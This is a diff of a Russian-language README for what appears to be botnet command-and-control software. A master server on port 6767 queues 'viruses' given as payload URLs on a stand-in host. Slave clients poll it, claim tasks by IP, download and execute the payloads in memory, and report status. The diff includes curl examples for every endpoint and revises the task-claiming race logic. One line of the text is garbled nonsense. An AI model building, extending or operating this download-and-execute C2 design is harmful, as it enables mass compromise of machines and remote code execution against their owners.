@@ -12,13 +12,14 @@
 
 ## Master API (port 6767)
 
-### `GET /poll` — забрать всю очередь вирусов
+### `GET /poll` — всё состояние мастера (`que` + `pro`)
 ```bash
 curl -s http://localhost:6767/poll
 ```
 ```json
-[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}]
+{"que":[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}],"pro":{"192.168.1.13":1}}
 ```
+`pro` — карта `ip -> id вируса`: слейв ищет в ней себя, чтобы узнать свою задачу и её статус.
 
 ### `POST /virus_add` — новый вирус в очередь
 
@@ -59,13 +60,13 @@ curl -s -X POST http://localhost:6767/virus_status \
 ```
 Ответ: `virus 1 is fifty`
 
-* `accepted` — клиент принял вирус, `out` = его IP в UTF-8 байтах (мастер кладёт пару `ip -> id` в `pro`). Пример для IP `192.168.1.13`:
+* `accepted` — клиент просит захватить вирус, `out` = его IP в UTF-8 байтах. Захват срабатывает только если вирус был `created` (гонку двух слейвов разруливает мастер). Пример для IP `192.168.1.13`:
 ```bash
 curl -s -X POST http://localhost:6767/virus_status \
   -H "Content-Type: application/json" \
   -d '{"id": 1, "status": "accepted", "out": [49,57,50,46,49,54,56,46,49,46,49,51]}'
 ```
-Ответ: `virus 1 accepted`
+Ответ: `virus 1 accepted` (взял таску) или `virus 1 already taken` (кто-то успел раньше)
 
 Не считать байты IP вручную:
 ```bash
@@ -85,15 +86,7 @@ curl -s -X POST http://localhost:6767/virus_remove \
 ```
 Ответы: `virus 1 removed` / `virus 1 not found in que`, неверный секрет → `401`.
 
-### `GET /list` — всё состояние мастера (`que` + `pro`)
-```bash
-curl -s http://localhost:6767/list
-```
-```json
-{"que":[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}],"pro":{"192.168.1.13":1}}
-```
-
-### `GET /pro` — где slave ищет себя
+### `GET /pro` — сырая карта `ip -> id` для ручной проверки
 ```bash
 curl -s http://localhost:6767/pro
 ```
@@ -104,12 +97,14 @@ curl -s http://localhost:6767/pro
 
 `/poll` ретраится при ошибке: экспоненциальный backoff 5 → 10 → 20 → ... сек (потолок — минутный интервал) до успеха, поэтому не пойманное дидди не ванну.
 
-Жизненный цикл на каждый вирус с наименьшим не занятым `id`:
-1. раз в минуту дёргает `GET /poll` и берёт оттуда вирус с наименьшим `id` со статусом `created`2. сразу шлёт `POST /virus_status` со статусом `accepted` и своим IP в `out`
+Жизненный цикл на каждый тик (раз в минуту):
+1. `GET /poll` → приходит весь снапшот (`que` + `pro`)
+2. ищем себя в `pro` по своему IP:
+   - **нашли** → смотрим статус назначенного вируса: не `cooked` → исполняем (FAQ-путь для рестартнувшегося слейва: доделает то, что не успел), `cooked` → отдыхаем
+   - **не нашли** → я свободный бот: беру вирус с наименьшим `id` со статусом `created` и шлю `accepted` со своим IP в `out`; мастер отвечает `virus N accepted` (захват успешен, дальше я единственный исполнитель) или `virus N already taken` (пролетел, но не расстраиваемся)
 3. скачивает payload с `virus.url` и шлёт `POST /virus_status` со статусом `fifty` (половина дела сделана)
 4. исполняет из памяти через maple
-5. **только после исполнения** идёт в `GET /pro` и ищет себя по своему IP; если мастер так и не записал `ip -> id` — перепосылаем `accepted` и проверяем ещё раз
-6. в конце шлёт `POST /virus_status` со статусом `cooked` — в `out` лежит `все по плану`; после этого вирус в `que` считает себя выполненным
+5. шлёт `POST /virus_status` со статусом `cooked` — в `out` лежит `все по плану`; после этого вирус в `que` считает себя выполненным
 
 Всё под `tokio::spawn` — не тормозим следующий poll.
 
